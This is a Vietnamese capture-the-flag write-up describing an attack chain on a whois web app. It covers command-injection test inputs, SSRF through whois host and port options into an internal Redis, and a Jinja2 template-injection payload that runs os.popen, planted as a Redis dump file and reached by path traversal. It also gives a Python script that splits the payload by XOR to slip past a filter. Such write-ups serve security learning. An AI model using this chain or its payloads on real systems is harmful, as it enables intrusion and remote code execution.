Initial Testing (Command Injection)

Tôi thử nhập google.com và nhận được thông tin đăng ký tên miền. Kết quả gợi ý backend có thể đang gọi công cụ whois, nên tôi kiểm tra khả năng chèn tham số và lệnh.

Để kiểm tra giả thuyết backend gọi whois qua shell, tôi thử các đầu vào google.com; id và google.com \`whoami\`. Các phản hồi sau đó giúp xác định giới hạn của hướng này.

Các đầu vào chứa ký tự đặc biệt bị bộ lọc chặn. Tôi chuyển sang kiểm tra những tham số hợp lệ của whois.

Discovering SSRF

Tôi đọc man whois để xem có thể điều khiển máy chủ đích và cổng kết nối qua những tham số nào.

whois mở kết nối TCP tới máy chủ tra cứu. Các tùy chọn -h và -p cho phép chọn máy chủ và cổng; nếu ứng dụng chuyển tiếp những tùy chọn này, chúng có thể trở thành một đường SSRF.

Tôi kiểm tra giả thuyết có Redis ở địa chỉ nội bộ 127.0.0.1:6379. Đây là phép thử trong môi trường CTF; việc dịch vụ có yêu cầu xác thực hay không phải được xác nhận qua phản hồi, không thể suy ra chỉ từ địa chỉ loopback.

SSRF đang hoạt động.

Soi mã nguồn HTML và phát hiện form được gửi qua phương thức POST tới endpoint /api/whois.

Exploiting Redis (SSTI)

Tôi có thể điều khiển Redis, nhưng cần tìm cách đọc file từ Redis.

Web đang dùng Template Engine (Jinja2) để đọc các file .tpl và render ra HTML.

Tôi thử giá trị style là ../db/dump để kiểm tra cách ứng dụng tìm template. Hướng cần xác minh là liệu một file Redis ghi ra có thể được template engine đọc lại hay không.

Tôi sẽ lợi dụng SSRF để gửi mã độc SSTI vào Redis, sau đó ra lệnh cho Redis lưu file đó thành dump.tpl và đặt vào thư mục web, thì khi ta truy cập /render?tpl=../db/dump, mã độc sẽ được kích hoạt

Sau đó tôi đọc tài liệu trên github PayloadsAllTheThings

Chuỗi cần kiểm tra gồm hai bước: đưa nội dung Jinja2 vào Redis để ghi thành dump.tpl, rồi gọi /render?tpl=../db/dump để xem ứng dụng có render file đó không.

WAF Bypass (Smuggling via BITOP XOR)

WAF cấm tất cả các kí tự quan trọng để mình sử dụng lỗi SSTI

Bộ lọc kiểm tra dữ liệu trước khi Redis xử lý. Tôi tìm cách gửi hai chuỗi được chấp nhận, rồi dựng lại payload bên trong Redis bằng phép XOR.

Lệnh BITOP XOR tạo giá trị mới từ hai chuỗi đã lưu. Tôi viết script Python để tách payload thành hai chuỗi đầu vào phù hợp với bộ lọc.

target = "{{config|attr(request.args.c)|attr(request.args.i)|attr(request.args.g)|attr(request.args.ge)(request.args.os)|attr(request.args.po)(request.args.cmd)|attr(request.args.r)()}}"
forbidden = set('/\\;\n|&`$!?*()"\'_ []<>{}#%=')
allowed = set(chr(i) for i in range(32,127)) - forbidden
s1, s2 = "", ""
for c in target:
    for a in allowed:
        for b in allowed:
            if ord(a)^ord(b)==ord(c):
                s1+=a; s2+=b; break
        else: continue
        break
print("S1="+s1)
print("S2="+s2)

Final Exploit

Trong Redis của bài CTF, tôi dùng FLUSHDB để dọn dữ liệu thử, lưu S1 và S2 bằng SET k1 và SET k2, rồi gọi BITOP XOR pwn k1 k2 để dựng lại payload. SAVE ghi snapshot xuống dump.tpl. Khi truy cập /render?tpl=../db/dump, Jinja2 đọc file này và trả về kết quả của os.popen('/flag').
